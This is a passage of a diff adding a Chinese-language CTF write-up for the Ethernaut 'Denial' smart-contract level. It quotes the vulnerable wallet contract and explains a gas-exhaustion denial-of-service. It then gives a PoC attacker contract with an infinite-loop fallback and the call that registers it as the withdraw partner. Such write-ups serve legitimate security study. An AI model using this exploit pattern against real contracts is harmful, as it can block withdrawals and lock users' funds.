@@ -1190,3 +1190,63 @@ POC:
 await contract.retract() // codex underflow
 await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", web3.utils.padLeft(player, 64))
 ```
+
+# Denial
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Denial {
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint256 amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+题目要求是：阻止合约的所有者在调用 withdraw() 函数时提取资金，条件是合约仍然有余额并且调用时的 gas 消耗不超过 1M gas。这是一个经典的 Dos(denial of service) 问题。
+
+题目提供的合约是一个简单的钱包合约，主要功能是将合约中的资金按比例（1%）分发给 partner（合伙人）和合约的所有者 owner。主要流程如下：
+1. 合约拥有者可以调用 setWithdrawPartner() 设置合伙人地址。
+2. 调用 withdraw() 函数时，合约中的 1% 余额会分别发给 partner 和 owner，即 partner 得到一部分资金，owner 得到另一部分。
+3. withdraw() 函数中首先使用 partner.call{value: amountToSend}("") 将资金发送给合伙人，紧接着调用 payable(owner).transfer(amountToSend) 将资金发送给合约的 owner。
+
+题目要求是通过某种方式阻止合约 owner 从合约中提取资金，但合约中的资金仍然存在。这意味着我们需要在 withdraw() 函数中让 payable(owner).transfer() 无法成功完成。可以通过利用 partner.call{value: amountToSend}("") 来消耗大量的gas，使得 payable(owner).transfer() 没有足够的gas执行。 call() 方法没有限制 gas 的使用，允许消耗大量的gas，而 transfer() 默认只能使用 2300 gas。如果 partner.call() 消耗了足够多的 gas，payable(owner).transfer() 就会因为gas不足而失败。将我们自己的合约设为 partner，在我们的合约中设计一种方法，消耗大量的gas，从而阻止 owner 提取资金。
+
+POC:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    fallback() external payable {
+        while(true){}
+    }
+}
+```
+```js
+await contract.setWithdrawPartner("0x096fb29B3474Fe58D8da00d52EAB27eF9b75Bb02")
+```
